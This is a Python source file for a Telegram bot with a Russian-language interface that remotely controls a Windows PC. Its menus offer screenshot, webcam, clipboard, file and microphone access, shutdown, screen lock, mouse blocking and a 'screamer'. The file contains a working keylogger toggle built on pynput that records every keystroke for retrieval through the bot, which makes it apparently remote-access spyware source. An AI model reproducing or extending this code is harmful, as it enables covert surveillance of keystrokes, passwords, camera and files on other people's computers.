from telethon import events, Button
from core.decorators import with_verify
from core.state import state
import database
from config import MAIN_ADMINS

def register_menus(bot):
    @bot.on(events.NewMessage(pattern=r'^(/start|/menu|🔙 Назад в меню)$'))
    @with_verify("Open Main Menu", dangerous=False)
    async def main_menu(event):
        kb = [
            [Button.text("📊 Статус ПК"), Button.text("⚙️ Процессы")],
            [Button.text("📸 Скриншот"), Button.text("🎥 Веб-камера")],
            [Button.text("📋 Буфер обмена"), Button.text("📂 Файлы (Диск C)")],
            [Button.text("🎬 Медиатека"), Button.text("🔽 Загрузить медиа")]
        ]
        if str(event.sender_id) in MAIN_ADMINS:
            kb.append([Button.text("👑 Админ Панель")])
        await event.reply("🎛 **Терминал управления:**", buttons=kb)

    @bot.on(events.NewMessage(func=lambda e: e.text == '👑 Админ Панель'))
    @with_verify("Open Admin Panel", dangerous=True)
    async def admin_panel(event):
        s = "🟢 ВКЛ" if state.security_mode else "🔴 ВЫКЛ"
        kl = "🟢 ВКЛ" if state.keylog_active else "🔴 ВЫКЛ"
        kb = [
            [Button.text("🔴 Выключить"), Button.text("🔄 Рестарт")],
            [Button.text("🖥 Потушить экран"), Button.text("🔒 Заблокировать ПК")],
            [Button.text("🚫 Блок мыши (10 сек)"), Button.text("🎤 Запись (10 сек)")],
            [Button.text("🔊 Сирена"), Button.text("👻 Скример")],
            [Button.text(f"🛡 Режим охраны: {s}"), Button.text(f"⌨️ Кейлог: {kl}")],
            [Button.text("🔙 Назад в меню")]
        ]
        await event.reply("👑 **ADMIN CONSOLE**\n`/say`, `/vol`, `/open`, `/mute`, `/type`, `/wallpaper`", buttons=kb)

    @bot.on(events.NewMessage(pattern=r'^🛡 Режим охраны:'))
    @with_verify("Toggle Security", dangerous=True)
    async def set_secure(event):
        state.security_mode = not state.security_mode
        await event.reply("🛡 Охрана: " + ("ВКЛ" if state.security_mode else "ВЫКЛ"))
        await admin_panel(event)  # Перерисовываем клавиатуру

    @bot.on(events.NewMessage(pattern=r'^⌨️ Кейлог:'))
    @with_verify("Toggle Keylogger", dangerous=True)
    async def toggle_keylog(event):
        from pynput import keyboard as kb
        if not state.keylog_active:
            state.keylog_active = True
            state.keylog_buffer = []

            def on_press(key):
                if not state.keylog_active:
                    return False
                try:
                    state.keylog_buffer.append(key.char if hasattr(key, 'char') and key.char else f'[{key.name}]')
                except Exception:
                    state.keylog_buffer.append(f'[{key}]')

            listener = kb.Listener(on_press=on_press)
            listener.daemon = True
            listener.start()
            state.keylog_listener = listener
            await event.reply("✅ Кейлоггер запущен. `/keylog get` — посмотреть лог.")
        else:
            state.keylog_active = False
            if state.keylog_listener:
                state.keylog_listener.stop()
                state.keylog_listener = None
            await event.reply("🛑 Кейлоггер остановлен.")
        await admin_panel(event)  # Перерисовываем клавиатуру

    @bot.on(events.NewMessage(pattern=r'^/adduser (\d+)(?: (\d+))?'))
    @with_verify("Add User", dangerous=True)
    async def adding_user(event):
        target_id = event.pattern_match.group(1)
        limit = int(event.pattern_match.group(2)) if event.pattern_match.group(2) else 5
        database.add(target_id, limit)
        await event.reply(f"✅ Пользователь {target_id} добавлен с лимитом {limit}.")

    @bot.on(events.NewMessage(pattern=r'^/deluser (\d+)'))
    @with_verify("Delete User", dangerous=True)
    async def deleting_user(event):
        target_id = event.pattern_match.group(1)
        if target_id in MAIN_ADMINS: 
            return await event.reply("❌ Нельзя удалить Главного Админа!")
        if database.remove(target_id): 
            await event.reply(f"🗑 Пользователь {target_id} удален.")
        else: 
            await event.reply("❌ Пользователь не найден.")

    @bot.on(events.NewMessage(pattern=r'^/users$'))
    @with_verify("List Users", dangerous=True)
    async def listing_users(event):
        text = "👥 **Доступ к системе:**\n\n"
        for uid, data in database.get_all().items():
            role_map = {"owner": "👑 Владелец", "admin": "🛡 Админ", "user": "👤 Юзер"}
            role = role_map.get(data['role'], "👤 Юзер")
            limit = "Безлимит" if data['role'] in ['owner', 'admin'] else f"{data['used_today']}/{data['limit']}"
            text += f"🔹 `{uid}` | {role} | Лимит: {limit}\n"
        await event.reply(text)